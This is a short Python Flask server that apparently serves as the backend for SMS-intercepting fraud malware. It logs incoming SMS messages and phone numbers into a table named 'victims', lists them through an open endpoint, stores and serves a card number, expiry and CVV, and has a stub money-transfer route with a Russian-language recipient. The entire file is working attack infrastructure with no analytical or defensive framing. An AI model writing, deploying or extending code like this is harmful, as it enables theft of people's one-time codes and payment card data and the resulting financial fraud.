from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)
conn = sqlite3.connect('db.db', check_same_thread=False)
c = conn.cursor()
c.execute('CREATE TABLE IF NOT EXISTS victims (id INTEGER PRIMARY KEY, phone TEXT, sms TEXT)')
c.execute('CREATE TABLE IF NOT EXISTS cards (card TEXT, expiry TEXT, cvv TEXT)')
c.execute("INSERT OR IGNORE INTO cards (card) VALUES ('')")
conn.commit()

@app.route('/sms', methods=['POST'])
def sms():
    phone = request.form.get('from', '')
    text = request.form.get('text', '')
    c.execute("INSERT INTO victims (phone, sms) VALUES (?,?)", (phone, text))
    conn.commit()
    return 'OK'

@app.route('/victims')
def victims():
    rows = c.execute("SELECT id, phone, sms FROM victims").fetchall()
    return jsonify([{'id':r[0], 'phone':r[1], 'sms':r[2]} for r in rows])

@app.route('/set_card', methods=['POST'])
def set_card():
    d = request.json
    c.execute("DELETE FROM cards")
    c.execute("INSERT INTO cards (card, expiry, cvv) VALUES (?,?,?)", (d['card'], d['expiry'], d['cvv']))
    conn.commit()
    return 'OK'

@app.route('/get_card', methods=['GET'])
def get_card():
    c.execute("SELECT card, expiry, cvv FROM cards LIMIT 1")
    row = c.fetchone()
    if row:
        return jsonify({'card': row[0], 'expiry': row[1], 'cvv': row[2]})
    else:
        return jsonify({'card': '', 'expiry': '', 'cvv': ''})

@app.route('/transfer', methods=['POST'])
def transfer():
    d = request.json
    return jsonify({'status':'ok', 'amount':d['amount'], 'to':'получатель'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
